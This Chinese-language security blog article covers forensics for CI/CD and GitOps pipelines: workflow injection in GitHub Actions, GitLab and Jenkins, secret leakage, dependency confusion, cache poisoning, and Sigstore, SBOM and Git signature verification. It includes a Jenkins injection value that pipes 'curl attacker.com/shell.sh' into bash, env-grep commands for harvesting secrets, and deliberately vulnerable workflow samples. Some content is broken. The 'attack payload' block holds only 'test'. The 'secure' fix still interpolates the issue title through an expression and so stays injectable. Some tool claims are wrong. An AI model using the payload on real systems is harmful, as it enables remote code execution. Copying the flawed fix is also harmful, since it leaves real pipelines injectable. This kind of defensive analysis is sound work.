---
title: "GitOps与CI/CD管道安全取证深度分析"
date: 2026-07-13T15:00:00+08:00
draft: false
weight: 790
description: "系统剖析GitOps与CI/CD管道安全取证全链路方法论，涵盖GitHub Actions/GitLab CI Workflow注入攻击检测、构建环境篡改与依赖投毒取证、Sigstore/Cosign制品签名与SBOM完整性验证、Git签名伪造与Webhook劫持分析、CI/CD凭证泄露与OIDC滥用检测、ArgoCD/FluxCD GitOps部署管道攻击取证，结合Codecov/Event-Stream等真实供应链攻击案例提供Sigma规则与自动化检测脚本"
categories: ["应急响应", "取证分析"]
tags: ["CI-CD安全", "GitOps", "GitHub Actions", "供应链安全", "Sigstore", "SBOM", "Workflow注入", "ArgoCD", "MITRE ATT&CK", "应急响应"]
---

# GitOps与CI/CD管道安全取证深度分析

现代软件开发的核心基础设施已经从传统的单体部署全面转向以 CI/CD（Continuous Integration/Continuous Deployment）管道为中枢的自动化交付体系。GitHub Actions、GitLab CI、Jenkins、ArgoCD、FluxCD 等工具构成了从代码提交到生产部署的全链路自动化管道——这条管道不仅承载着软件的构建、测试和发布流程，更成为了攻击者觊觎的高价值目标。一旦 CI/CD 管道被攻陷，攻击者可以绕过所有传统的安全边界，在软件供应链的上游投毒，将恶意代码注入到成千上万的下游系统中。

与传统的安全取证不同，CI/CD 管道安全取证面临的挑战是多维度的：攻击面横跨代码仓库、构建环境、制品仓库和部署编排四个信任域；Workflow 日志、构建日志、Webhook 日志、审计日志分布在不同平台；攻击手法涵盖 Workflow Injection、Secrets 窃取、构建缓存投毒、制品签名伪造等多种类型。从 2021 年的 Codecov Bash Uploader 事件到持续曝光的 GitHub Actions Workflow Injection 漏洞，CI/CD 安全事件的频率和影响都在持续升级。

本文系统性地梳理 GitOps 与 CI/CD 管道安全取证的全链路方法论，从 Workflow 注入攻击检测到构建环境篡改取证，从 Sigstore/SBOM 制品完整性验证到 Git 签名伪造分析，结合 Codecov、event-stream 等真实供应链攻击案例还原完整攻击链，并提供可直接落地的 Sigma 规则和自动化检测脚本。

---

## 0x01 技术基础与 CI/CD 管道取证概述

### 主流 CI/CD 架构对比

不同的 CI/CD 平台在信任模型、安全机制和取证数据源上存在显著差异。选择正确的取证方法之前，必须先理解目标平台的架构特征。

| 特性维度 | GitHub Actions | GitLab CI | Jenkins | CircleCI | Azure DevOps |
|---------|---------------|-----------|---------|----------|-------------|
| 信任模型 | 仓库级隔离，基于 OIDC 令牌与云平台 Identity Federation | 项目级隔离，基于 Project Access Token | 全局 Agent 架构，共享工作空间 | 容器级隔离，基于 Context 管理 | 服务连接器（Service Connection）模型 |
| 密钥管理 | GitHub Secrets（环境/仓库/组织级） | CI/CD Variables（项目/组/实例级） | Credentials Plugin（全局/文件/域级） | Context + Environment Variables | Service Connections + Variable Groups |
| 日志系统 | Workflow Run 日志（含 mask 机制） | Pipeline/Job/Stage 三级日志 | Console Output + Audit Trail | Job Output + Step Details | Build Logs + Timeline |
| 审计能力 | Organization Audit Log（GitHub Enterprise） | 审计事件流（Ultimate 版本） | Audit Trail Plugin + Blue Ocean | Audit API | Azure Activity Log |
| 签名支持 | Sigstore OIDC 原生集成 | Cosign 手动集成 | Cosign 插件 | 自定义步骤 | Azure Attestation |
| Runner 类型 | 托管 Runner / Self-hosted Runner | Shared Runner / Specific Runner | Master-Agent 架构 | 托管 Machine / Self-hosted | Microsoft-hosted / Self-hosted |
| Workflow 文件 | `.github/workflows/*.yml` | `.gitlab-ci.yml` | `Jenkinsfile` | `.circleci/config.yml` | `azure-pipelines.yml` |

### CI/CD 信任模型与攻击面分析

CI/CD 管道构建了一个复杂的信任链，每个环节都可能成为攻击者的突破口。理解信任模型是开展取证分析的前提。

| 信任域 | 信任边界 | 攻击向量 | MITRE ATT&CK |
|-------|---------|---------|-------------|
| 代码仓库 | Git 推送权限 → Workflow 触发 | Workflow 文件篡改、恶意分支合并、Webhook 伪造 | T1195.002, T1078.004 |
| 构建环境 | Workflow 脚本 → Runner 执行 | Script Injection、环境变量污染、缓存投毒 | T1059, T1552.001 |
| 制品仓库 | 构建产物 → 推送/拉取 | 制品篡改、签名伪造、标签覆盖 | T1195.002, T1553.002 |
| 部署编排 | GitOps 同步 → K8s 应用 | Manifest 篡改、RBAC 绕过、Drift 注入 | T1610, T1078.001 |
| 依赖供应链 | 包管理器 → 解析安装 | Dependency Confusion、Typosquatting | T1195.002 |

### 管道全链路攻击面映射

从代码提交到生产部署，CI/CD 管道的每个阶段都存在可被利用的攻击面：

```
代码提交 ──→ Workflow 触发 ──→ 依赖解析 ──→ 构建编译 ──→ 制品签名 ──→ 制品分发 ──→ 部署编排
  │              │               │            │             │            │             │
  │              │               │            │             │            │             │
  ▼              ▼               ▼            ▼             ▼            ▼             ▼
Git签名伪造   Workflow注入    依赖投毒     缓存投毒     签名伪造     中间人攻击    Manifest篡改
Webhook劫持   Script注入     Typosquatting 镜像篡改     证书伪造     标签覆盖      RBAC绕过
分支保护绕过   Secret泄露     Dependency    构建工具链    Rekor        分发通道劫持   Drift投毒
              OIDC滥用       Confusion     篡改         日志篡改                  HPA操纵
```

### GitOps 工作流与传统 CI/CD 的安全差异

GitOps（如 ArgoCD、FluxCD）将 Git 仓库作为基础设施和应用配置的唯一可信来源（Single Source of Truth），通过持续同步机制将 Git 中的期望状态（Desired State）自动应用到 Kubernetes 集群。与传统 CI/CD 相比，GitOps 引入了独特的安全考量：

| 对比维度 | 传统 CI/CD | GitOps |
|---------|-----------|--------|
| 推送模型 | CI 系统主动推送制品到目标环境 | GitOps 控制器从 Git 拉取并同步到集群 |
| 审计轨迹 | 构建日志、部署日志 | Git 历史 + 同步日志 + Drift 检测日志 |
| 回滚机制 | 重新部署历史版本 | Git revert 触发自动回滚 |
| 密钥管理 | CI/CD 变量/Secrets | External Secrets Operator / Vault |
| 攻击面特征 | Pipeline 注入、Secrets 泄露 | Git 仓库投毒、Manifest 篡改、同步控制器滥用 |
| 信任锚点 | CI 平台凭证 | Git 签名 + GPG/SSH Commit 签名 |

### CI/CD 取证数据源全景表

有效的取证分析依赖于全面的数据采集。CI/CD 环境中的关键数据源包括：

| 数据源类别 | 具体数据 | 采集方式 | 保留期限 | 取证价值 |
|-----------|---------|---------|---------|---------|
| Workflow 日志 | 每个 Job/Step 的执行输出 | API 导出 / UI 下载 | 90 天（免费版） | 🔴 核心证据 |
| 构建日志 | 编译输出、依赖安装日志 | Runner 本地日志 / 集中日志平台 | 取决于配置 | 🟡 辅助证据 |
| 制品仓库日志 | 推送/拉取记录、签名数据 | Registry Audit Log / API | 90 天 | 🔴 核心证据 |
| 审计日志 | 用户操作、权限变更、密钥访问 | Organization Audit Log / API | 取决于版本 | 🔴 核心证据 |
| Webhook 日志 | 触发事件、请求/响应内容 | Webhook 配置页面 / 第三方日志 | 短期 | 🟡 高价值 |
| Git 引用日志 | 分支变更、推送记录 | `git reflog` / 服务端引用日志 | 持续 | 🟡 辅助证据 |
| 依赖锁定文件 | package-lock.json / Pipfile.lock | 仓库文件 | 持续 | 🟡 辅助证据 |
| 制品签名记录 | Cosign 签名、Rekor 透明日志 | Sigstore API / Rekor 查询 | 持久化 | 🔴 核心证据 |

### 取证工具链

CI/CD 管道安全取证需要一套专门化的工具链：

| 工具名称 | 功能定位 | 适用场景 | 获取方式 |
|---------|---------|---------|---------|
| `gh` CLI | GitHub API 交互 | Workflow 日志导出、Audit Log 查询、Secrets 检查 | `brew install gh` |
| `glab` CLI | GitLab API 交互 | Pipeline 日志导出、CI 变量审计 | `brew install glab` |
| `act` | GitHub Actions 本地执行 | Workflow 安全分析、行为复现 | `brew install act` |
| `cosign` | Sigstore 制品签名验证 | 容器镜像/二进制签名验证 | `brew install cosign` |
| `syft` | SBOM 生成 | 生成 SPDX/CycloneDX 格式 SBOM | `brew install syft` |
| `grype` | 基于 SBOM 的漏洞扫描 | 依赖漏洞匹配 | `brew install grype` |
| `trivy` | 容器镜像安全扫描 | 镜像漏洞/配置/密钥扫描 | `brew install trivy` |
| `in-toto` | 供应链完整性验证 | 软件供应链元数据验证 | `pip install in-toto` |
| `rekor-cli` | Rekor 透明日志查询 | 查询签名记录和审计轨迹 | `brew install rekor-cli` |
| `semgrep` | 静态分析 | Workflow 文件安全规则扫描 | `brew install semgrep` |
| `jq` | JSON 日志解析 | 审计日志结构化分析 | `brew install jq` |
| `sigma-cli` | Sigma 规则执行 | 安全检测规则自动化 | `pip install sigma-cli` |

---

## 0x02 Workflow/Pipeline 注入攻击

### GitHub Actions 注入攻击

GitHub Actions 是目前使用最广泛的 CI/CD 平台之一，其 Workflow Injection 漏洞已成为最常见的 CI/CD 攻击向量。攻击者通过控制 Workflow 中的输入上下文（Context），将恶意代码注入到 Shell 脚本中执行。MITRE ATT&CK 将此类攻击归类为 T1059（Command and Scripting Interpreter）和 T1195.002（Supply Chain Compromise: Software Supply Chain）。

#### 基础 Script Injection

Workflow Injection 的核心原理是：当 Workflow 文件中使用 `${{ }}` 表达式直接引用攻击者可控的上下文（如 Issue 标题、PR 描述、Commit 消息）时，GitHub Actions 引擎会在执行前将表达式替换为实际值，如果替换后的值包含 Shell 元字符，就会被 Shell 解析执行。

**漏洞 Workflow 示例：**

```yaml
name: Vulnerable Workflow
on:
  issues:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Comment on issue
        run: echo "Hello ${{ github.event.issue.title }}"
```

**攻击 Payload：**

攻击者创建一个标题为以下内容的 Issue：

```
test
```

**修复后的安全写法：**

```yaml
name: Secure Workflow
on:
  issues:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Comment on issue
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "Hello ${{ env.ISSUE_TITLE }}"
```

#### 常见易受攻击的上下文字段

| 上下文字段 | 攻击者可控方式 | 注入向量 | 危害等级 |
|-----------|-------------|---------|---------|
| `github.event.issue.title` | 创建/编辑 Issue 标题 | `run:` 脚本直接引用 | 🔴 严重 |
| `github.event.issue.body` | 创建/编辑 Issue 内容 | `run:` 脚本直接引用 | 🔴 严重 |
| `github.event.pull_request.title` | 创建/编辑 PR 标题 | `run:` 脚本直接引用 | 🔴 严重 |
| `github.event.pull_request.body` | 创建/编辑 PR 内容 | `run:` 脚本直接引用 | 🔴 严重 |
| `github.event.comment.body` | 创建评论 | `run:` 脚本直接引用 | 🔴 严重 |
| `github.event.review.body` | 创建 PR Review | `run:` 脚本直接引用 | 🔴 严重 |
| `github.event.head_commit.message` | 推送 Commit 消息 | `run:` 脚本直接引用 | 🟡 高危 |
| `github.event.commits[].message` | 批量推送 Commit | `run:` 脚本直接引用 | 🟡 高危 |
| `github.event.pages[].page_name` | 创建/删除 Git 页面 | `run:` 脚本直接引用 | 🟡 高危 |

#### Composite Action 注入

Composite Action 是 GitHub Actions 中允许将多个步骤封装为可复用 Action 的机制。如果 Composite Action 的输入参数未经验证就被拼接到 Shell 命令中，同样存在注入风险。

**漏洞 Composite Action：**

```yaml
name: 'Vulnerable Composite Action'
description: 'A vulnerable composite action'
inputs:
  label-name:
    description: 'Label name'
    required: true
runs:
  using: 'composite'
  steps:
    - shell: bash
      run: gh issue edit ${{ github.event.issue.number }} --add-label "${{ inputs.label-name }}"
```

**修复方式 — 使用环境变量隔离：**

```yaml
name: 'Secure Composite Action'
description: 'A secure composite action'
inputs:
  label-name:
    description: 'Label name'
    required: true
runs:
  using: 'composite'
  steps:
    - shell: bash
      env:
        LABEL_NAME: ${{ inputs.label-name }}
        ISSUE_NUMBER: ${{ github.event.issue.number }}
      run: gh issue edit "$ISSUE_NUMBER" --add-label "$LABEL_NAME"
```

#### Reusable Workflow 滥用

Reusable Workflow 允许在多个 Workflow 间共享同一定义。如果 Reusable Workflow 的输入参数未正确校验，或者调用方传递了未预期的 Secrets，可能导致权限提升或数据泄露。

**恶意 Reusable Workflow 调用场景：**

```yaml
name: Caller Workflow
on:
  workflow_dispatch:

jobs:
  call-reusable:
    uses: target-org/target-repo/.github/workflows/build.yml@main
    secrets:
      inherit
```

当攻击者获得对 `target-repo` 的写权限后，可以在 `build.yml` 中添加数据外传步骤，而 `secrets: inherit` 会将调用方的所有 Secrets 传递给被调用的 Workflow。

### GitLab CI 变量泄露与命令注入

GitLab CI 使用 `.gitlab-ci.yml` 定义管道，其注入机制与 GitHub Actions 类似但有区别。GitLab CI 的变量在 Job 日志中会被自动 mask（如果值匹配 mask 模式），但并非所有变量都被自动 mask。

**命令注入示例：**

```yaml
stages:
  - test

test_job:
  stage: test
  script:
    - echo "Testing branch: $CI_COMMIT_BRANCH"
    - curl -s "https://example.com/api?repo=$CI_PROJECT_NAME"
```

如果 `CI_PROJECT_NAME` 等变量被攻击者通过 Project Rename 等方式控制，可以注入命令。更危险的是自定义 CI/CD Variables 的使用：

```yaml
deploy_job:
  stage: deploy
  script:
    - echo "$DEPLOY_TOKEN" | base64 -d > /tmp/token.txt
    - ./deploy.sh --token-file /tmp/token.txt
```

如果 `DEPLOY_TOKEN` 的值未被正确 mask 且包含特殊字符，可能被利用进行命令注入。

**GitLab CI 变量暴露风险对比：**

| 变量类型 | 默认 Mask | 默认 Protected | 日志可见性 | 风险等级 |
|---------|----------|--------------|-----------|---------|
| `CI_JOB_TOKEN` | 否 | N/A | 自动 mask | 🟡 高危 |
| `CI_COMMIT_BRANCH` | 否 | N/A | 明文可见 | 🟢 低危 |
| 项目级自定义变量 | 可配置 | 可配置 | 取决于 mask 设置 | 🟡 取决于配置 |
| 文件类型变量 | 否 | 可配置 | 明文可见 | 🔴 严重 |
| `dotenv` 变量 | 否 | 可配置 | 明文可见 | 🔴 严重 |

### Jenkins Pipeline 漏洞

Jenkins Pipeline（基于 Groovy DSL）的注入攻击面与 GitHub Actions/GitLab CI 有本质区别。Jenkins Pipeline 运行在 Master 节点的 Groovy 沙箱中，但沙箱逃逸和权限提升是已知攻击向量。

**Groovy 脚本注入示例：**

```groovy
pipeline {
    agent any
    parameters {
        string(name: 'BRANCH', defaultValue: 'main', description: 'Branch to build')
    }
    stages {
        stage('Build') {
            steps {
                sh "git checkout ${params.BRANCH}"
            }
        }
    }
}
```

如果 `params.BRANCH` 被控制为 `main; curl attacker.com/shell.sh | bash`，可以实现命令注入。

**Jenkins Sandbox 逃逸已知手法：**

| 攻击手法 | MITRE ATT&CK | 具体实现 | 影响范围 |
|---------|-------------|---------|---------|
| `Runtime.exec()` 反射调用 | T1059 | 通过 Groovy 元编程绕过沙箱白名单 | 🔴 Remote Code Execution |
| `MethodClosure` 利用 | T1059 | 使用 Groovy 闭包特性执行任意代码 | 🔴 Remote Code Execution |
| `Pipeline Script from SCM` | T1059 | 从恶意仓库加载 Pipeline 脚本 | 🔴 完全控制 |
| Shared Library 投毒 | T1195.002 | 注入恶意 Shared Library | 🔴 全管道污染 |
| `withCredentials` 泄露 | T1552.001 | 在日志中打印获取的凭证 | 🟡 Credential Exposure |

### 环境变量污染与 Secrets 泄露

CI/CD 环境中的 Secrets 管理是安全的关键环节。不同平台的 Secrets 泄露机制各有差异：

| 平台 | Secrets 加密方式 | 日志 Mask 机制 | Secrets 传递范围 | 轮换能力 |
|-----|-----------------|---------------|-----------------|---------|
| GitHub Actions | AES-256 加密存储 | 自动 mask（支持自定义 patterns） | Workflow 级（可限制到环境） | 支持环境级 Secrets |
| GitLab CI | AES-256 加密存储 | 自动 mask（仅限值完全匹配） | Job 级（可配置 protected/unprotected） | 支持文件类型变量 |
| Jenkins | Credentials Plugin | `credentials()` 步骤 | Pipeline 级 | 支持定期轮换 |
| CircleCI | 加密存储 | Context + Environment 隔离 | 环境级 | 支持 Context 管理 |

**Secrets 泄露的常见途径：**

```bash
env | grep -i secret
env | grep -i token
env | grep -i password
env | grep -i api_key
printenv | sort
```

当攻击者通过 Workflow Injection 获得 Shell 执行权限后，上述命令可以提取所有环境变量中的敏感信息。此外，一些间接泄露途径同样需要关注：

| 泄露途径 | 具体手法 | 检测方法 |
|---------|---------|---------|
| 日志输出 | 在错误处理中打印环境变量 | Workflow 日志审查 |
| 工具调试模式 | 启用 verbose/debug 输出含 Secret | 检查命令行参数 |
| 制品内嵌 | 将 Secret 写入构建产物 | 制品内容扫描 |
| 测试报告外传 | 将含 Secret 的测试结果发送到外部服务 | 出站流量监控 |
| Git 历史 | 将 Secret 提交到仓库 | `git log -p | grep -i secret` |
| HTTP Referer | 在 URL 中携带 Secret 发起请求 | Web 服务器日志分析 |

---

## 0x03 构建环境篡改与依赖投毒

### 依赖混淆攻击（Dependency Confusion）

依赖混淆攻击由安全研究员 Alex Birsan 于 2021 年披露，利用了包管理器在解析依赖时对公共仓库和私有仓库的命名空间优先级差异。MITRE ATT&CK 将此类攻击归类为 T1195.002（Supply Chain Compromise: Software Supply Chain）。

**攻击原理：**

当组织使用私有包管理器仓库（如 GitHub Packages、npm Enterprise）时，如果构建系统同时配置了公共仓库作为 fallback，攻击者可以在公共仓库上发布同名但更高版本的包，诱导构建系统安装恶意包。

| 包管理器 | 命名空间优先级 | 防护机制 | 取证要点 |
|---------|-------------|---------|---------|
| npm | 按 scope 和 registry 顺序 | `.npmrc` 配置、`--scope` 参数 | 检查 `.npmrc` 中的 registry 优先级 |
| pip | 按 `--index-url` / `--extra-index-url` 顺序 | `--no-index` + `--find-links` | 检查 `pip.conf` 配置 |
| Maven | 按 `repository` 声明顺序 | `settings.xml` 仓库镜像配置 | 检查 `settings.xml` 仓库优先级 |
| RubyGems | 按 `Gemfile` 源声明顺序 | Bundler `--local` 参数 | 检查 `Gemfile` 源顺序 |

**检测依赖混淆的审计命令：**

```bash
npm ls --all --parseable | while read pkg; do
  if echo "$pkg" | grep -q "node_modules/"; then
    name=$(echo "$pkg" | sed 's|.*/node_modules/||')
    version=$(npm ls "$name" --json 2>/dev/null | jq -r ".dependencies.\"$name\".version // \"unknown\"")
    resolved=$(npm ls "$name" --json 2>/dev/null | jq -r ".dependencies.\"$name\".resolved // \"N/A\"")
    if echo "$resolved" | grep -q "registry.npmjs.org" && echo "$name" | grep -q "@private/"; then
      echo "[ALERT] Potentially confused dependency: $name@$version from $resolved"
    fi
  fi
done
```

### 构建缓存投毒（Build Cache Poisoning）

构建缓存机制（如 `actions/cache`、Gradle Build Cache、Docker Layer Cache）旨在加速 CI/CD 管道执行，但如果缓存键（Cache Key）设计不当，攻击者可以通过污染共享缓存来影响后续构建。

**GitHub Actions 缓存投毒示例：**

```yaml
name: Cache Poisoning Example
on: push

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Restore cache
        uses: actions/cache@v4
        with:
          path: ~/.npm
          key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            npm-${{ runner.os }}-
      - run: npm ci
      - run: npm run build
```

当缓存 Key 使用 `restore-keys` 前缀匹配时，攻击者可以通过在分支上提交修改后的 `package-lock.json` 来污染缓存，使得后续 `main` 分支的构建使用被污染的缓存。

**缓存投毒检测方法：**

```bash
gh api repos/{owner}/{repo}/actions/caches --jq '.actions_caches[] | {
  id: .id,
  key: .key,
  ref: .ref,
  created_at: .created_at,
  size_in_bytes: .size_in_bytes,
  version: .version
}' | jq 'sort_by(.created_at) | reverse'
```

### Docker 镜像篡改与供应链攻击

容器镜像作为 CI/CD 管道的核心制品，其完整性直接关系到部署安全。镜像篡改可以通过多种途径实现：

| 攻击手法 | MITRE ATT&CK | 具体实现 | 防御措施 |
|---------|-------------|---------|---------|
| 标签覆盖 | T1195.002 | 覆盖 `latest` 或语义化版本标签 | Content Trust / Cosign 签名验证 |
| 基础镜像替换 | T1195.002 | 使用恶意基础镜像替代官方镜像 | 固定摘要（`@sha256:...`） |
| Layer 注入 | T1195.002 | 在镜像构建过程中注入恶意 Layer | 多阶段构建 + SBOM 验证 |
| Registry 中间人 | T1557.001 | 拦截镜像拉取请求返回恶意镜像 | TLS 严格验证 + 证书固定 |
| 私有 Registry 污染 | T1195.002 | 在私有 Registry 中替换合法镜像 | 基于摘要的镜像引用 |

**镜像完整性验证流程：**

```bash
docker pull registry.example.com/app:v1.2.3
cosign verify \
  --key cosign.pub \
  --certificate-identity "https://github.com/org/repo/.github/workflows/build.yml@refs/heads/main" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  registry.example.com/app:v1.2.3

cosign verify-attestation \
  --type slsaprovenance \
  --key cosign.pub \
  registry.example.com/app:v1.2.3
```

### npm/PyPI 包投毒与 Typosquatting

npm 和 PyPI 生态是供应链攻击的重灾区。攻击者利用开发者的行为习惯（如拼写错误、复制粘贴）实施投毒。

**npm Typosquatting 检测：**

```bash
cat package.json | jq '.dependencies, .devDependencies' | jq -r 'to_entries[] | .key' | while read pkg; do
  npm view "$pkg" --json 2>/dev/null | jq -r '.name // empty' | grep -q "^$" && echo "[ALERT] Package not found: $pkg"
  npm view "$pkg" --json 2>/dev/null | jq -r '.time // empty' | head -1 | while read created; do
    if [ -n "$created" ]; then
      age_days=$(( ($(date +%s) - $(date -jf "%Y-%m-%dT%H:%M:%S.%3Z" "$created" +%s 2>/dev/null || echo 0)) / 86400 ))
      if [ "$age_days" -lt 30 ]; then
        echo "[WARNING] Recently published package: $pkg (age: ${age_days} days)"
      fi
    fi
  done
done
```

**PyPI 投毒检测：**

```bash
pip install pip-audit
pip-audit --fix --dry-run --desc
```

### 构建工具链完整性验证

构建工具链（编译器、包管理器、构建脚本）的完整性是构建环境安全的基石。任何工具链组件被篡改都可能导致构建产物被植入恶意代码。

| 工具链组件 | 验证方法 | 取证命令 |
|-----------|---------|---------|
| Node.js | 二进制签名验证 | `shasum -a 256 node-v*.tar.gz && gpg --verify SHASUMS256.txt.sig` |
| Python | pyenv 版本锁定 + hash 验证 | `pyenv install --list && sha256sum Python-*.tar.xz` |
| Docker | Docker Content Trust | `export DOCKER_CONTENT_TRUST=1` |
| Go | 模块校验和数据库 | `go mod verify` |
| Rust | crates.io 签名验证 | `cargo verify-project` |

---

## 0x04 制品签名与完整性验证

### Sigstore/Cosign 签名验证框架

Sigstore 是一个为软件供应链提供免费签名基础设施的开源项目，其核心组件包括：

| 组件 | 功能 | 技术实现 |
|-----|------|---------|
| Fulcio | 签发短期证书 | 基于 OIDC 令牌（如 GitHub Actions OIDC）签发 X.509 证书 |
| Rekor | 透明日志 | 基于 Merkle Tree 的防篡改日志，记录所有签名事件 |
| Cosign | 制品签名/验证 | 容器镜像、文件、SBOM 的签名和验证工具 |
| Beleney | Sigstore 客户端 | Rust 实现的 Sigstore 客户端 |
| Gitsign | Git commit 签名 | 基于 Sigstore 的 Git commit 签名工具 |

**Cosign 签名验证完整流程：**

```bash
cosign verify \
  --certificate-identity-regexp "https://github.com/.*" \
  --certificate-oidc-issuer "https://token.actions.githubusercontent.com" \
  ghcr.io/owner/image@sha256:abc123def456...

cosign verify-attestation \
  --type cyclonedx \
  ghcr.io/owner/image@sha256:abc123def456...

rekor-cli search --rekor_server https://rekor.sigstore.dev \
  --public-key cosign.pub \
  --email user@example.com

rekor-cli get --rekor_server https://rekor.sigstore.dev \
  --log-index <LOG_INDEX>
```

**Sigstore 取证检查清单：**

| 检查项 | 命令 | 预期结果 |
|-------|------|---------|
| 签名验证 | `cosign verify --key cosign.pub IMAGE` | 证书链有效，身份匹配 |
| Rekor 日志查询 | `rekor-cli search --email EMAIL` | 存在对应的透明日志条目 |
| Attestation 验证 | `cosign verify-attestation --type slsaprovenance IMAGE` | Provenance 信息完整 |
| 证书过期检查 | `cosign verify` 输出中的证书有效期 | 证书在有效期内 |
| OIDC Issuer 验证 | 检查证书中的 OIDC Issuer 字段 | Issuer 匹配预期的 CI 平台 |

### SLSA（Supply-chain Levels for Software Artifacts）框架

SLSA 是 Google 主导提出的供应链安全框架，定义了四个安全等级，从源代码到部署的完整供应链安全保障：

| SLSA 等级 | 安全要求 | 保护能力 | 取证验证方法 |
|-----------|---------|---------|------------|
| Level 1 | 构建过程有文档化 | 防止篡改（有审计日志） | 检查构建日志和 Provenance 文件存在性 |
| Level 2 | 使用托管构建服务 | 防止篡改（有签名的 Provenance） | 验证 Provenance 签名和构建服务身份 |
| Level 3 | 构建平台有防篡改保证 | 防止内部威胁和外部篡改 | 验证 SLSA Provenance 中的构建平台信息 |
| Level 4 | 双人审查 + 可重现构建 | 最高级别防篡改 | 验证多个独立构建的哈希一致性 |

**SLSA Provenance 验证示例：**

```bash
cosign verify-attestation \
  --type slsaprovenance \
  --key cosign.pub \
  ghcr.io/owner/image@sha256:abc123...
```

### SBOM（Software Bill of Materials）生成与验证

SBOM 是软件供应链透明度的基础，记录了软件制品中包含的所有组件及其版本信息。主要格式包括 SPDX 和 CycloneDX。

**使用 Syft 生成 SBOM：**

```bash
syft packages dir:. -o spdx-json > sbom.spdx.json
syft packages dir:. -o cyclonedx-json > sbom.cdx.json
syft packages docker:ghcr.io/owner/image:latest -o spdx-json > image-sbom.spdx.json
```

**使用 Grype 基于 SBOM 进行漏洞扫描：**

```bash
grype sbom:sbom.spdx.json
grype sbom:sbom.spdx.json -o json | jq '.matches[] | {
  vulnerability: .vulnerability.id,
  severity: .vulnerability.severity,
  package: .artifact.name,
  version: .artifact.version,
  fixed_in: .vulnerability.fix.versions[0]
}'
```

**SBOM 完整性验证矩阵：**

| 验证维度 | 验证内容 | 验证工具 | 通过标准 |
|---------|---------|---------|---------|
| 存在性 | 制品是否附带 SBOM | `cosign verify-attestation --type cyclonedx` | Attestation 存在且签名有效 |
| 完整性 | SBOM 中列出的组件是否与实际构建一致 | `syft` 重新生成 + `diff` 比对 | 组件列表一致 |
| 漏洞状态 | SBOM 中的组件是否存在已知漏洞 | `grype sbom:sbom.json` | 无 Critical/High 漏洞 |
| 来源验证 | SBOM 中的组件来源是否可信 | 交叉比对仓库元数据 | 所有组件来自可信来源 |

### Provenance 证明（in-toto Attestations）

in-toto 是一个软件供应链完整性的保障框架，通过定义供应链中的每个步骤（layout）和执行者（functionary）来确保从源代码到最终制品的每一步都可审计。

**in-toto Layout 结构示例：**

```json
{
  "signed": {
    "_type": "layout",
    "expires": "2027-01-01T00:00:00Z",
    "keys": {
      "keyid": "abcdef1234567890",
      "keyval": {"public": "-----BEGIN PUBLIC KEY-----\n..."}
    },
    "steps": [
      {
        "name": "build",
        "expected_materials": [["MATCH", "src/**", {"exclude": ["src/test/**"]}, ["REPO_KEY"]]],
        "expected_products": [["CREATE", "dist/**"]],
        "pubkeys": ["REPO_KEY"],
        "threshold": 1
      },
      {
        "name": "test",
        "expected_materials": [["MATCH", "dist/**", ["REPO_KEY"]]],
        "expected_products": [],
        "pubkeys": ["REPO_KEY"],
        "threshold": 1
      }
    ],
    "inspect": []
  },
  "signatures": [
    {
      "keyid": "abcdef1234567890",
      "sig": "3045022100..."
    }
  ]
}
```

### 制品仓库安全审计

制品仓库是 CI/CD 管道的核心组件，其安全审计覆盖访问控制、签名验证和漏洞扫描等多个维度。

| 审计维度 | Harbor | Nexus Repository | GitHub Container Registry |
|---------|--------|-------------------|--------------------------|
| 访问控制 | RBAC + 项目隔离 | Realm + Role-Based | Organization/Repository 级权限 |
| 签名验证 | Cosign/Notary 集成 | Cosign 插件 | Cosign OIDC 集成 |
| 漏洞扫描 | Trivy/Clair 内置 | Nexus IQ 集成 | GitHub Advanced Security |
| 审计日志 | 项目级操作日志 | 访问日志 + 操作日志 | Organization Audit Log |
| 保留策略 | Tag 保留 + 垃圾回收 | 内存清理策略 | 不支持（需手动管理） |

---

## 0x05 代码仓库安全与 Git 签名伪造

### GPG/SSH Commit 签名绕过

Git Commit 签名是验证代码来源真实性的重要机制。GitHub 支持 GPG 和 SSH 两种签名方式。然而，签名机制存在多个可被绕过的弱点。

**绕过场景分析：**

| 绕过手法 | 具体实现 | 影响 | 检测方法 |
|---------|---------|------|---------|
| Branch Protection 未强制签名 | Repository Settings 中未启用 `Require signed commits` | 任何未签名提交可合并 | 检查 Branch Protection Rules |
| 通过 GitHub UI 合并 | Web 界面合并不保留原始签名 | 签名失效 | 检查 Merge Commit 的 GPG 签名状态 |
| Rebase 后签名丢失 | `git rebase` 后需要重新签名 | 误以为签名有效 | `git log --show-signature` 逐条检查 |
| SSH 签名密钥复用 | 同一 SSH 密钥用于认证和签名 | 身份无法区分 | 检查密钥用途字段 |
| 已撤销密钥签名 | 使用已撤销的 GPG 密钥创建签名 | 签名看似有效但信任链断裂 | 查询 GPG 密钥服务器验证撤销状态 |

**Git 签名验证检查：**

```bash
git log --show-signature --format='%H %GN <%GE> %s' | head -50
git log --format='%H %G?' --all | while read hash status; do
  case "$status" in
    G) echo "[VALID] $hash - Good signature" ;;
    U) echo "[UNKNOWN] $hash - Unknown key" ;;
    B) echo "[BAD] $hash - Bad signature" ;;
    X) echo "[EXPIRED] $hash - Expired key" ;;
    E) echo "[ERROR] $hash - Signature error" ;;
    N) echo "[UNSIGNED] $hash - No signature" ;;
    *) echo "[?] $hash - Status: $status" ;;
  esac
done
```

### Branch 保护规则绕过

Branch Protection Rules 是 GitHub 仓库安全的核心机制，但配置不当或存在绕过路径时会被攻击者利用。

**常见绕过场景：**

```yaml
Branch Protection 绕过场景：
├── Repository Admin 权限绕过
│   └── Admin 用户可强制推送（"Include administrators" 未启用）
├── Direct Push 绕过
│   └── 具有 Write 权限的用户可绕过 PR 审查
├── API 绕过
│   └── 使用 GitHub API 创建/合并 PR 可绕过部分检查
├── Organization 策略降级
│   └── Organization Owner 降低仓库安全级别
└── Webhook 触发绕过
    └── 通过 `repository_dispatch` 事件触发 Workflow
```

**Branch Protection 审计命令：**

```bash
gh api repos/{owner}/{repo}/branches/main/protection --jq '{
  required_pull_request_reviews: .required_pull_request_reviews,
  enforce_admins: .enforce_admins,
  required_status_checks: .required_status_checks,
  restrictions: .restrictions
}'
```

